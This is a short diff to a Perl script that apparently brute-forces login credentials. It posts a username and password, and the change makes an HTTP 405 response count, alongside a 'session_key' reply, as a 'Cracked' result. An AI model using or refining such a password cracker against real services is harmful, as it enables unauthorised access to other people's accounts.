@@ -50,7 +50,7 @@ chomp $username;
 			credentials_type => 'password'
 			}
 			);
-		if ($response->content=~ /"session_key"/) {
+		if ($response->content=~ /"session_key"/ or $response->code == 405) {
 			print "\t			----------------------------------
 			| Cracked :($username:$password) |\n
 			----------------------------------\n
